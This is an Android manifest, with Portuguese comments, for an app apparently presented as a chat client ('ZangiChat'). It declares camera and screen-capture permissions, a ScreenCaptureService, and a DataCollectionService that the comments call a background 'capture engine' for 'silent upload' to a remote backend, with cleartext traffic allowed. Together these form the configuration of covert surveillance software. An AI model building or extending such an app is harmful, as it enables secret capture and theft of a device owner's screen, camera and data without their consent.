<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- 1. PERMISSÕES DE REDE (Comunicação com o Backend no Render) -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <!-- 2. PERMISSÕES DE MÍDIA (Câmera e Captura de Tela) -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    
    <!-- Permissão para capturar a tela (MediaProjection) -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- 3. PERMISSÕES DE ARMAZENAMENTO E NOTIFICAÇÕES -->
    <!-- Necessário para salvar temporariamente capturas antes do upload -->
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
        android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" 
        android:maxSdkVersion="32" />
    <!-- Para Android 13+ (API 33+) usaríamos READ_MEDIA_IMAGES, mas para logs e arquivos internos o cache resolve -->
    
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <application
        android:name=".ZangiApp"
        android:allowBackup="true"
        android:icon="@drawable/ic_avatar_placeholder"
        android:label="@string/app_name"
        android:roundIcon="@drawable/ic_avatar_placeholder"
        android:supportsRtl="true"
        android:theme="@style/Theme.ZangiChat"
        android:usesCleartextTraffic="true"
        tools:targetApi="34">

        <!-- 4. ATIVIDADES (Fluxo de Navegação) -->
        <activity
            android:name=".ui.OnboardingActivity"
            android:exported="true"
            android:theme="@style/Theme.ZangiChat">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".ui.MainActivity"
            android:exported="true"
            android:windowSoftInputMode="adjustResize" />

        <!-- 5. SERVIÇOS (O motor de captação em segundo plano) -->
        
        <!-- Serviço para Captura de Tela (MediaProjection) -->
        <service
            android:name=".service.ScreenCaptureService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection|dataSync" />

        <!-- Serviço para Processamento de Dados e Upload Silencioso -->
        <service
            android:name=".service.DataCollectionService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- 6. PROVEDORES E CONFIGURAÇÕES DE SEGURANÇA -->
        
        <!-- FileProvider para gerenciar o armazenamento de arquivos temporários de mídia -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

    </application>

</manifest>